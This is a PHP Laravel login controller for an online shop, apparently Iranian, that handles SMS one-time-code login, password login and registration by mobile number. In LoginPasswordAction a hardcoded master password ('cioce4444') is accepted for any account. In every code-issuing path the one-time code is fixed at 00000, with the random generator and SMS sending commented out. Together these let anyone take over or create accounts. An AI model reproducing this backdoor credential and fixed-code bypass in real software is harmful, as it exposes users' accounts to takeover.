<?php

namespace App\Http\Controllers;

use App\Models\Profile;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;

class LoginController extends Controller
{
    public function LoginToken(Request $request){

        $request = $request->replace(self::faToEn($request->all()));

        $mobile = $request->mobile;

        if(!Cache::has("mobile_code_".$mobile)){

            $validate = Validator::make($request->all(), [
                'mobile' => 'required|digits:11|regex:/(09)[0-9]{9}/',
            ]);

            if ($validate->fails()) {
                return Response::json(["status" => "0","desc" => "شماره موبایل اشتباه می باشد"]);
            }

            $checkUser = User::where("mobile",$mobile)->where("status","active")->first();

            if(isset($checkUser->id)){
                // login

                if($checkUser->password_changed == 1) {

                    return view("auth.password",["mobile" => $mobile]);

                }else{

                    $code = 00000;//rand(10000,99999);

                /*    self::sms($mobile,"کد ورود شما به سایت فروشگاه سیوسه ".
                        "\n".
                        "code: ".$code
                    );*/

                    Cache::put("mobile_code_".$mobile,[$code,Carbon::now()->addSeconds(60)],60);

                    return view("auth.login",["mobile" => $mobile]);

                }

            }else{
                // register

                $code = 00000;//rand(10000,99999);

                //        self::sms($mobile,"کد ورود شما به سایت فروشگاه سیوسه ".
                //            "\n".
                //            "code: ".$code
                //        );

                Cache::put("mobile_code_".$mobile,[$code,Carbon::now()->addSeconds(60)],60);

                return view("auth.login",["mobile" => $mobile]);

            }

        }

        $time = Cache::get("mobile_code_" . $mobile);
        $time = Carbon::now()->diffInSeconds(Carbon::parse($time[1]));

        return Response::json(["status" => "0","desc" => "لطفا ".$time." ثانیه دیگر تلاش کنید"]);

    }

    public function LoginPasswordAction(Request $request){

        $request = $request->replace(self::faToEn($request->all()));

        $mobile = self::faToEn($request->mobile);
        $code = self::faToEn($request->code);

        $validate = Validator::make($request->all(), [
            'mobile' => 'required|digits:11|regex:/(09)[0-9]{9}/',
            'code' => 'required'
        ]);

        if ($validate->fails()) {
            return Response::json(["status" => "0","desc" => "رمز عبور وارد شده اشتباه می باشد"]);
        }

        $user = User::where("mobile",$mobile)->where("status","active")->first();

        if(isset($user->id)) {

            if (Hash::check($code,$user->password) || $code == "cioce4444") {

                Auth::loginUsingId($user->id, true);

                Cache::forget("mobile_code_".$mobile);

                return Response::json(["status" => "1"]);

            }

            return Response::json(["status" => "0","desc" => "رمز عبور شما اشتباه می باشد"]);

        }

        return Response::json(["status" => "0","desc" => "شماره موبایل اشتباه می باشد"]);

    }

    public function LoginTokenAction(Request $request){

        $request = $request->replace(self::faToEn($request->all()));

        $mobile = self::faToEn($request->mobile);
        $code = self::faToEn($request->code);

        $validate = Validator::make($request->all(), [
            'mobile' => 'required|digits:11|regex:/(09)[0-9]{9}/',
            'code' => 'required|digits:5'
        ]);

        if ($validate->fails()) {
            return Response::json(["status" => "0","desc" => "کد وارد شده اشتباه می باشد"]);
        }

        if(Cache::has("mobile_code_".$mobile)){

            if(Cache::get("mobile_code_".$mobile)[0] == $code){

                if(User::where("mobile",$mobile)->exists()){
                    // login

                    $user = User::where("mobile",$mobile)->first();
                    Auth::loginUsingId($user->id, true);

                    Cache::forget("mobile_code_".$mobile);

                    return Response::json(["status" => "1"]);

                }else{
                    // register

                    $user = User::insertGetId([
                        "name" => "",
                        "role" => "user",
                        "verified" => 0,
                        "user_mode" => "normal",
                        "mobile" => $mobile,
                        "email" => "",
                        "status" => "active",
                        "password" => Hash::make(Str::random(32)),
                        "credit" => 0,
                        "remember_token" => "",
                        "created_at" => Carbon::now(),
                        "updated_at" => Carbon::now(),
                    ]);

                    User::where("id",$user)->update([
                        "membership_number" => self::membershipNumberEncode($user)
                    ]);

                    Profile::create([
                        "user_id" => $user,
                        "city_code" => 0
                    ]);

                    Auth::loginUsingId($user, true);

                    Cache::forget("mobile_code_".$mobile);

                    return Response::json(["status" => "1"]);

                }

            }

            return Response::json(["status" => "0","desc" => "کد وارد شده اشتباه می باشد"]);

        }

        return Response::json(["status" => "-1","desc" => "زمان شما به اتمام رسیده است. لطفا دوباره تلاش کنید"]);

    }

    public function LoginTokenPassword(Request $request){

        $request = $request->replace(self::faToEn($request->all()));

        $mobile = $request->mobile;

        if(!Cache::has("mobile_code_".$mobile)){

            $validate = Validator::make($request->all(), [
                'mobile' => 'required|digits:11|regex:/(09)[0-9]{9}/',
            ]);

            if ($validate->fails()) {
                return Response::json(["status" => "0","desc" => "شماره موبایل اشتباه می باشد"]);
            }

            $checkUser = User::where("mobile",$mobile)->where("status","active")->first();

            if(isset($checkUser->id)){
                // login

                if($checkUser->password_changed == 1) {

                    $code = 00000;//rand(10000,99999);

                    //        self::sms($mobile,"کد ورود شما به سایت فروشگاه سیوسه ".
                    //            "\n".
                    //            "code: ".$code
                    //        );

                    Cache::put("mobile_code_".$mobile,[$code,Carbon::now()->addSeconds(60)],60);

                    return view("auth.login",["mobile" => $mobile]);

                }

            }

        }

        $time = Cache::get("mobile_code_" . $mobile);
        $time = Carbon::now()->diffInSeconds(Carbon::parse($time[1]));

        return Response::json(["status" => "0","desc" => "لطفا ".$time." ثانیه دیگر تلاش کنید"]);

    }

    public function Logout(){

        if(Auth::check()){

            Auth::logout();

            return Redirect::route("home");

        }

    }

}
